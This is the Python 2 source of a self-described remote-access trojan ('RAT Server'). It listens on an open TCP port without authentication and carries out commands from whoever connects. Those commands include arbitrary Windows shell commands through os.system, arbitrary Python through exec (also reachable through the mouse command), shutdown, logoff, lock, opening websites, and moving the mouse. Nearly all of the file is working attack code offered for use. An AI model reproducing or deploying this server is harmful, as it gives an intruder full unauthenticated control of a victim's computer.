# RAT Server by Matthew Taylor. Visit matthewaptaylor.github.io for more info.
# Python RAT Server v1.1 by Matthew Taylor. See more at matthewaptaylor.github.io. This is licensed under the MIT license. This license requires credit to be given to the program's creator.

import socket
import ctypes
import subprocess
import os
import easygui
import winsound

print"""==========
RAT Server
==========
"""

HOST = "0.0.0.0" # IP address
PORT = 2220 # Default port

print "Connection info:"
print "IP: " + socket.gethostbyname(socket.gethostname())
print

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)
conn, addr = s.accept()
print "SERVER > Connection made: " + str(addr)
while 1:
    command = conn.recv(1024)
    if not command: break
    if command[:4].lower() == "stop":
        print "CLIENT > Stop commanded"
        print "SERVER > Stopping"
        exit()
    if command[:4].lower() == "send":
        easygui.msgbox(command[5:], title="Python RAT")
        print "CLIENT > Message: " + command[5:]
    elif command[:6].lower() == "logoff":
        print "CLIENT > Logoff commanded"
        print "SERVER > Logging off"
        subprocess.call(["shutdown", "/l"])
    elif command[:8].lower() == "shutdown":
        print "CLIENT > Shutdown commanded"
        print "SERVER > Shutting down"
        subprocess.call(["shutdown", "/s"])
    elif command[:7].lower() == "restart":
        print "CLIENT > Restart commanded"
        print "SERVER > Restarting"
        subprocess.call(["shutdown", "/r"])
    elif command[:4].lower() == "lock":
        print "CLIENT > Lock commanded"
        print "SERVER > Locking"
        os.system("rundll32.exe user32.dll,LockWorkStation")
    elif command[:9].lower() == "open site":
        print "CLIENT > Website launch commanded"
        print "SERVER > Opening " + command[10:] + " in default browser"
        os.system('start "link" "' + command[10:] + '"')
    elif command[:8].lower() == "rom open":
        print "CLIENT > CD/DVD-ROM open commanded"
        print "SERVER > Opening CD/DVD-ROM"
        ctypes.windll.winmm.mciSendStringW(u"set cdaudio door open", None, 0, None)
    elif command[:9].lower() == "rom close":
        print "CLIENT > CD/DVD-ROM close commanded"
        print "SERVER > Closing CD/DVD-ROM"
        ctypes.windll.winmm.mciSendStringW(u"set cdaudio door closed", None, 0, None)
    elif command[:10].lower() == "sound file":
        print "CLIENT > Sound play commanded"
        print "SERVER > Playing sound file " + command[11:]
        winsound.PlaySound("sounds/" + command[11:], winsound.SND_ASYNC)
    elif command[:5].lower() == "mouse":
        exec("pos = " + command[6:])
        print "CLIENT > Mouse move commanded"
        print "SERVER > Moving mouse to (" + str(pos[0]) + ", " + str(pos[0]) + ")" 
        ctypes.windll.user32.SetCursorPos(pos[0], pos[1])
    elif command[:3].lower() == "cmd":
        print "CLIENT > CMD command sent"
        print "SERVER > Executing windows command " + command[4:]
        os.system(command[4:])
    elif command[:6].lower() == "python":
        print "CLIENT > Python command sent"
        print "SERVER > Executing python command " + command[7:]
        exec(command[7:])
    conn.sendall(command)
conn.close()
